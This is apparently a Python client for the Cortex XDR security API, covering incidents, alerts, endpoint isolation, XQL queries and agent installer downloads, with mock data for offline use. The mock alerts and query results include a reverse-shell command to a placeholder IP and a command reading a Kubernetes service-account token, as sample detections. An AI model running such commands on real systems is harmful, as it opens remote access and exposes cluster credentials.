"""
Cortex XDR API client.

Implements both Cortex XDR API authentication modes and auto-detects which one
the key uses:
  • Advanced — nonce + timestamp + SHA-256(api_key + nonce + timestamp)
  • Standard — the API key sent directly as the Authorization header

Credentials come from the environment (CORTEX_API_KEY, CORTEX_API_KEY_ID); the
tenant FQDN comes from config (cortex.fqdn) or the CORTEX_FQDN env var.

`mock_mode` (or missing creds/FQDN) returns realistic canned data so the whole
flow — including the MCP tools — works offline.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import re
import secrets
import string
import time
from pathlib import Path
from typing import Any, Optional

import httpx

from sirius.config import CortexConfig

_log = logging.getLogger("sirius.cortex")

# Substrings that mark an incident/alert/asset as Kubernetes-related.
K8S_MARKERS = (
    "kubernetes", "k8s", "container", "pod", "eks", "kubectl", "kube",
    "docker", "containerd", "cri-o", "serviceaccount", "cluster",
)


class CortexError(RuntimeError):
    pass


class CortexClient:
    def __init__(self, cfg: CortexConfig) -> None:
        self.cfg = cfg
        self.fqdn = (cfg.fqdn or os.environ.get("CORTEX_FQDN", "")).rstrip("/")
        self.api_key = os.environ.get("CORTEX_API_KEY", "").strip().strip('"')
        self.api_key_id = os.environ.get("CORTEX_API_KEY_ID", "").strip().strip('"')
        self._advanced = cfg.advanced_auth  # may flip during auto-detect
        self.mock = cfg.mock_mode or not (self.fqdn and self.api_key and self.api_key_id)
        if self.mock:
            _log.info("Cortex client in MOCK mode (fqdn/creds missing or mock_mode=true).")

    # ── auth ──────────────────────────────────────────────────────────────────
    def _headers(self, advanced: Optional[bool] = None) -> dict[str, str]:
        advanced = self._advanced if advanced is None else advanced
        if advanced:
            nonce = "".join(secrets.choice(string.ascii_letters + string.digits)
                            for _ in range(64))
            timestamp = str(int(time.time()) * 1000)
            digest = hashlib.sha256(
                (self.api_key + nonce + timestamp).encode("utf-8")).hexdigest()
            return {
                "x-xdr-timestamp": timestamp,
                "x-xdr-nonce": nonce,
                "x-xdr-auth-id": str(self.api_key_id),
                "Authorization": digest,
                "Content-Type": "application/json",
            }
        return {
            "x-xdr-auth-id": str(self.api_key_id),
            "Authorization": self.api_key,
            "Content-Type": "application/json",
        }

    def _post(self, path: str, request_data: Optional[dict] = None) -> dict:
        url = f"{self.fqdn}/public_api/v1/{path.lstrip('/')}"
        body = {"request_data": request_data or {}}
        with httpx.Client(timeout=45.0) as client:
            resp = client.post(url, headers=self._headers(), json=body)
            # Auto-detect: on an auth failure, flip auth mode once and retry.
            if resp.status_code in (401, 403):
                flipped = not self._advanced
                retry = client.post(url, headers=self._headers(flipped), json=body)
                if retry.status_code == 200:
                    self._advanced = flipped
                    _log.info("Cortex auth mode set to %s.",
                              "advanced" if flipped else "standard")
                    resp = retry
        if resp.status_code != 200:
            raise CortexError(
                f"Cortex API {path} -> HTTP {resp.status_code}: {resp.text[:300]}")
        return resp.json().get("reply", {})

    def test_connection(self) -> dict:
        """Lightweight auth/connectivity probe. Returns {ok, auth_mode, ...}."""
        if self.mock:
            return {"ok": True, "mock": True, "auth_mode": "mock"}
        try:
            r = self._post("incidents/get_incidents/",
                           {"search_from": 0, "search_to": 1})
            return {"ok": True, "auth_mode": "advanced" if self._advanced else "standard",
                    "fqdn": self.fqdn, "total_incidents": r.get("total_count")}
        except Exception as e:  # noqa: BLE001
            return {"ok": False, "error": str(e)[:300], "fqdn": self.fqdn}

    # ── incidents / alerts ──────────────────────────────────────────────────────
    def get_incidents(self, limit: int = 50, filters: Optional[list] = None) -> dict:
        if self.mock:
            return _MOCK["incidents"]
        req: dict[str, Any] = {"search_from": 0, "search_to": limit,
                               "sort": {"field": "creation_time", "keyword": "desc"}}
        if filters:
            req["filters"] = filters
        return self._post("incidents/get_incidents/", req)

    def get_incident_extra_data(self, incident_id: str, alerts_limit: int = 100) -> dict:
        if self.mock:
            return _MOCK["incident_extra"]
        return self._post("incidents/get_incident_extra_data/",
                          {"incident_id": incident_id, "alerts_limit": alerts_limit})

    def get_alerts(self, limit: int = 50, filters: Optional[list] = None) -> dict:
        if self.mock:
            return _MOCK["alerts"]
        req: dict[str, Any] = {"search_from": 0, "search_to": limit,
                               "sort": {"field": "creation_time", "keyword": "desc"}}
        if filters:
            req["filters"] = filters
        return self._post("alerts/get_alerts_multi_events/", req)

    def get_endpoints(self, limit: int = 100) -> dict:
        if self.mock:
            return _MOCK["endpoints"]
        return self._post("endpoints/get_endpoint/", {"search_from": 0, "search_to": limit})

    # ── response actions ────────────────────────────────────────────────────────
    def isolate_endpoint(self, endpoint_id: str) -> dict:
        if self.mock:
            return {"action_id": "mock-iso-123", "endpoint_id": endpoint_id,
                    "status": "PENDING", "note": "MOCK isolate"}
        return self._post("endpoints/isolate/", {"endpoint_id": endpoint_id})

    def unisolate_endpoint(self, endpoint_id: str) -> dict:
        if self.mock:
            return {"action_id": "mock-uniso-123", "endpoint_id": endpoint_id,
                    "status": "PENDING", "note": "MOCK unisolate"}
        return self._post("endpoints/unisolate/", {"endpoint_id": endpoint_id})

    def scan_endpoint(self, endpoint_id: str) -> dict:
        if self.mock:
            return {"action_id": "mock-scan-123", "endpoint_id": endpoint_id, "status": "PENDING"}
        return self._post("endpoints/scan/",
                          {"filters": [{"field": "endpoint_id_list",
                                        "operator": "in", "value": [endpoint_id]}]})

    def get_action_status(self, action_id: str) -> dict:
        if self.mock:
            return {"data": {action_id: "COMPLETED_SUCCESSFULLY"}}
        return self._post("actions/get_action_status/", {"group_action_id": action_id})

    # ── XQL ─────────────────────────────────────────────────────────────────────
    def run_xql_query(self, query: str, timeframe_minutes: int = 60) -> dict:
        if self.mock:
            return {"query": query, "results": _MOCK["xql_results"], "mock": True}
        now = int(time.time()) * 1000
        start = self._post("xql/start_xql_query/", {
            "query": query, "tenants": [],
            "timeframe": {"from": now - timeframe_minutes * 60_000, "to": now}})
        query_id = start if isinstance(start, str) else start.get("query_id", start)
        for _ in range(15):
            res = self._post("xql/get_query_results/",
                             {"query_id": query_id, "pending_flag": True,
                              "limit": 100, "format": "json"})
            if res.get("status") == "SUCCESS":
                return {"query": query, "query_id": query_id, "results": res.get("results", {})}
            time.sleep(2)
        return {"query": query, "query_id": query_id, "status": "PENDING"}

    # ── agent distributions ───────────────────────────────────────────────────────
    # NOTE: the public Distributions API is oriented at ENDPOINT installers.
    # `distributions/create` (endpoint installers) is verified against a live tenant;
    # whether the returned distribution_id is exactly the one the Kubernetes agent Helm
    # chart consumes is UNVERIFIED and must be tested separately. Mock mode returns a
    # canned id so the end-to-end flow works offline.
    def get_distribution_versions(self) -> dict:
        if self.mock:
            return _MOCK["distribution_versions"]
        return self._post("distributions/get_versions/", {})

    def create_distribution(self, name: str, platform: str = "linux",
                            package_type: str = "standalone",
                            agent_version: str = "") -> dict:
        if self.mock:
            return {**_MOCK["create_distribution"], "name": name,
                    "platform": platform, "package_type": package_type}
        req: dict[str, Any] = {"name": name, "platform": platform,
                               "package_type": package_type}
        if agent_version:
            req["agent_version"] = agent_version
        # Endpoint is `distributions/create` (NOT the Traps-era
        # `create_distribution`, which 500s). `agent_version` is REQUIRED for a
        # standalone installer; the call is async — the download URL is only
        # available once the package finishes building (poll get_distribution_url).
        return self._post("distributions/create", req)

    def get_distribution_url(self, distribution_id: str,
                             package_type: str = "x64") -> dict:
        if self.mock:
            return {"distribution_id": distribution_id,
                    "distribution_url": _MOCK["create_distribution"]["distribution_url"]}
        return self._post("distributions/get_dist_url/",
                          {"distribution_id": distribution_id, "package_type": package_type})

    def download_distribution(self, distribution_id: str, dest_dir: str,
                              package_type: str = "x64", poll_attempts: int = 20,
                              poll_interval: float = 15.0) -> dict:
        """Poll for a built distribution's URL, then download the installer.

        `distributions/create` is asynchronous: get_dist_url returns HTTP 500
        (err_extra "Distr...") for ~1 min while the package builds, so we poll. The
        signed /public_api/v1/download/<JWT> URL still requires the API auth headers
        (it 401s without them), so we resend them. The filename is taken from the
        response's Content-Disposition, else decoded from the URL's JWT, else derived
        from the id. Returns {ok, distribution_id, package_type, path, bytes, url}.
        """
        out = Path(dest_dir)
        out.mkdir(parents=True, exist_ok=True)
        if self.mock:
            dest = out / f"{distribution_id}_{package_type}.msi"
            dest.write_bytes(b"MOCK-CORTEX-DISTRIBUTION")
            return {"ok": True, "mock": True, "distribution_id": distribution_id,
                    "package_type": package_type, "path": str(dest),
                    "bytes": dest.stat().st_size,
                    "url": _MOCK["create_distribution"]["distribution_url"]}

        url, last_err = "", ""
        for _ in range(max(1, poll_attempts)):
            try:
                rep = self.get_distribution_url(distribution_id, package_type)
                url = rep.get("distribution_url", "") if isinstance(rep, dict) else ""
                if url.startswith("http"):
                    break
            except CortexError as e:  # async build not finished yet
                last_err = str(e)
            time.sleep(poll_interval)
        if not url.startswith("http"):
            raise CortexError(
                f"distribution {distribution_id} not ready after {poll_attempts} "
                f"polls ({poll_attempts * poll_interval:.0f}s): {last_err[:200]}")

        headers = {k: v for k, v in self._headers().items()
                   if k.lower() != "content-type"}
        dest = out / (_filename_from_jwt(url) or f"{distribution_id}_{package_type}.msi")
        with httpx.Client(timeout=300.0, follow_redirects=True) as client:
            with client.stream("GET", url, headers=headers) as r:
                cd_name = _filename_from_cd(r.headers.get("content-disposition", ""))
                if cd_name:
                    dest = out / cd_name
                r.raise_for_status()
                with open(dest, "wb") as f:
                    for chunk in r.iter_bytes():
                        f.write(chunk)
        return {"ok": True, "distribution_id": distribution_id,
                "package_type": package_type, "path": str(dest),
                "bytes": dest.stat().st_size, "url": url}


# ── distribution download helpers ───────────────────────────────────────────────
def _filename_from_jwt(url: str) -> Optional[str]:
    """Extract the installer filename from the download URL's JWT payload."""
    try:
        token = url.rstrip("/").rsplit("/", 1)[-1]
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)  # restore base64 padding
        data = json.loads(base64.urlsafe_b64decode(payload))
        return data.get("data", {}).get("file_name") or data.get("file_name")
    except Exception:  # noqa: BLE001
        return None


def _filename_from_cd(content_disposition: str) -> Optional[str]:
    """Parse a filename out of a Content-Disposition header, if present."""
    m = re.search(r'filename\*?=(?:UTF-8\'\')?"?([^";]+)"?',
                  content_disposition, re.IGNORECASE)
    return m.group(1) if m else None


# ── k8s helpers (client-side filtering, works live or mock) ─────────────────────
def is_k8s_related(obj: dict) -> bool:
    blob = " ".join(str(v) for v in obj.values()).lower()
    return any(m in blob for m in K8S_MARKERS)


# ── Mock data (offline demo) ────────────────────────────────────────────────────
_MOCK = {
    "incidents": {
        "total_count": 2,
        "incidents": [
            {"incident_id": "INC-1042", "severity": "high", "status": "new",
             "description": "Suspicious kubectl exec + reverse shell in vulnerable pod",
             "hosts": ["vuln-web-7d9f"], "alert_count": 4,
             "creation_time": 1752547200000},
            {"incident_id": "INC-1039", "severity": "medium", "status": "under_investigation",
             "description": "Outbound connection to known-bad IP from EKS node",
             "hosts": ["ip-10-0-2-51"], "alert_count": 2,
             "creation_time": 1752543600000},
        ],
    },
    "incident_extra": {
        "incident": {"incident_id": "INC-1042", "severity": "high",
                     "description": "Suspicious kubectl exec + reverse shell in vulnerable pod",
                     "hosts": ["vuln-web-7d9f"]},
        "alerts": {"total_count": 4, "data": [
            {"alert_id": "AL-88213", "name": "Reverse shell detected", "severity": "high",
             "host_name": "vuln-web-7d9f", "endpoint_id": "ep-7d9f", "category": "Execution",
             "mitre_tactic_id_and_name": "TA0002 - Execution",
             "action_process_image_command_line": "sh -i >& /dev/tcp/10.0.9.9/4444 0>&1"},
            {"alert_id": "AL-88190", "name": "Service account token accessed from container",
             "severity": "high", "host_name": "vuln-web-7d9f", "endpoint_id": "ep-7d9f",
             "category": "Credential Access", "mitre_tactic_id_and_name": "TA0006 - Credential Access",
             "action_process_image_command_line": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
            {"alert_id": "AL-88155", "name": "Port scan from pod", "severity": "medium",
             "host_name": "vuln-api-55c", "endpoint_id": "ep-55c", "category": "Discovery",
             "mitre_tactic_id_and_name": "TA0007 - Discovery"},
            {"alert_id": "AL-88101", "name": "Suspicious DNS to malicious-c2 domain",
             "severity": "medium", "host_name": "vuln-web-7d9f", "endpoint_id": "ep-7d9f",
             "category": "Command and Control",
             "mitre_tactic_id_and_name": "TA0011 - Command and Control"},
        ]},
    },
    "alerts": {
        "total_count": 3,
        "alerts": [
            {"alert_id": "AL-88213", "name": "Reverse shell detected", "severity": "high",
             "host_name": "vuln-web-7d9f", "endpoint_id": "ep-7d9f", "category": "Execution"},
            {"alert_id": "AL-88190", "name": "Service account token accessed from container",
             "severity": "high", "host_name": "vuln-web-7d9f", "endpoint_id": "ep-7d9f",
             "category": "Credential Access"},
            {"alert_id": "AL-88155", "name": "Port scan from pod", "severity": "medium",
             "host_name": "vuln-api-55c", "endpoint_id": "ep-55c", "category": "Discovery"},
        ],
    },
    "endpoints": {
        "total_count": 3,
        "endpoints": [
            {"endpoint_id": "ep-7d9f", "endpoint_name": "vuln-web-7d9f",
             "endpoint_status": "CONNECTED", "os_type": "AGENT_OS_LINUX",
             "ip": ["10.0.2.14"], "group_name": "eks-workers", "is_isolated": "AGENT_UNISOLATED"},
            {"endpoint_id": "ep-55c", "endpoint_name": "vuln-api-55c",
             "endpoint_status": "CONNECTED", "os_type": "AGENT_OS_LINUX",
             "ip": ["10.0.2.31"], "group_name": "eks-workers", "is_isolated": "AGENT_UNISOLATED"},
            {"endpoint_id": "ep-node1", "endpoint_name": "ip-10-0-2-51",
             "endpoint_status": "CONNECTED", "os_type": "AGENT_OS_LINUX",
             "ip": ["10.0.2.51"], "group_name": "eks-nodes", "is_isolated": "AGENT_UNISOLATED"},
        ],
    },
    "xql_results": {
        "data": [
            {"_time": "2026-07-15T02:14:03Z", "action_process_image_name": "sh",
             "actor_process_command_line": "sh -i >& /dev/tcp/10.0.9.9/4444 0>&1",
             "agent_hostname": "vuln-web-7d9f"},
            {"_time": "2026-07-15T02:14:31Z", "action_process_image_name": "cat",
             "actor_process_command_line": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
             "agent_hostname": "vuln-web-7d9f"},
        ]
    },
    "distribution_versions": {
        "windows": ["8.4.0", "8.3.1"],
        "linux": ["8.4.0", "8.3.1"],
        "macos": ["8.4.0"],
    },
    "create_distribution": {
        "distribution_id": "mock-dist-0f3a9c2e-k8s",
        "distribution_url": ("https://distributions.traps.paloaltonetworks.com/"
                             "mock/mock-dist-0f3a9c2e-k8s"),
        "mock": True,
    },
}
